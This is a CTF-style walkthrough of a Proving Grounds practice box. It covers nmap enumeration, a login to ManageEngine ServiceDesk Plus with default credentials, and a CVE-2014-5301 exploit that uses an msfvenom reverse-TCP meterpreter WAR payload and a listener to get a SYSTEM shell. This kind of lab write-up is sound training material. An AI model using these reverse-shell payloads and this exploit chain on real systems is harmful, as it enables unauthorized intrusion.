---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Performing a `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- 192.168.62.43
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 11:29 EST
Nmap scan report for 192.168.62.43
Host is up (0.00052s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 124.22 seconds

$ nmap -Pn -p3389,8080 -sV -O 192.168.62.43
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-03 11:32 EST
Nmap scan report for 192.168.62.43
Host is up (0.00043s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:50:56:BF:F0:40 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone
Running: Microsoft Windows 2008|8.1|7|Phone|Vista
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::- cp>
OS details: Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Embedded Standard 7, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2>
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds

```

## web application (port 8080)

> Login mask reveals that `ManageEngine Service Desk Plus 7.6.0` is installed
{: .prompt-info }

---

# exploitation
## default credentials
Googling for standard credentials of `ManageEngine Service Desk Plus` shows that `administrator:administrator` is set as default.

![default credentials](images/helpdesk1.png)

> Default credentials are working here!
{: .prompt-info }

## public exploits

There are public exploits available which allow an authenticated remote code execution.  
The exploit we are using can be found here: [CVE-2014-5301](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py)

```python
#!/usr/bin/python3

# This script exploits the directory traversal vulnerability in
# ManageEngine ServiceDesk Plus. It has been tested on version 7.6.0.
# See also https://www.cvedetails.com/cve/CVE-2014-5301/

# Use msfvenom to create a war file with meterpreter payload
# msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f war > shell.war
#
# or with a reverse TCP shell
# msfvenom -p java/shell_reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f war > shell.war

# Before executing the script start the meterpreter handler
# meterpreter
#   use multi/handler
#   set payload java/meterpreter/reverse_tcp
#   set LHOST 192.168.56.108
#   run
#
# or start netcat listener on LPORT
# nc -nlvp 4444

# Script usage: ./CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE
# HOST: target host
# PORT: target port
# USERNAME: a valid username for ManageEngine ServiceDesk Plus
# PASSWORD: the password for the user
# WARFILE: a war file containing the mallicious payload
...
```

## use the exploit
### generate the web shell
```bash
$ msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.62.200 LPORT=4444 -f war > shell.war
```

### start the `meterpreter` listener
```bash
$ msfconsole
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/meterpreter/reverse_tcp
payload => java/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.62.200
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.62.200:4444 
```

### fire the exploit
```bash
$ python3 CVE-2014-5301.py 192.168.62.43 8080 administrator administrator shell.war
```

### check for meterpreter session
```bash
...
[*] Started reverse TCP handler on 192.168.62.200:4444 
[*] Sending stage (58060 bytes) to 192.168.62.43
[*] Meterpreter session 1 opened (192.168.62.200:4444 -> 192.168.62.43:49182 ) at 2022-01-03 11:58:12 -0500

meterpreter > 
```

> It worked! We got a shell.
{: .prompt-info }

---

# post exploitation
## get the flag
```bash
meterpreter > getuid
Server username: SYSTEM
meterpreter > shell
Process 1 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\ManageEngine\ServiceDesk\bin>whoami
whoami
nt authority\system
C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
0******************************4
```

Pwned! <@:-)
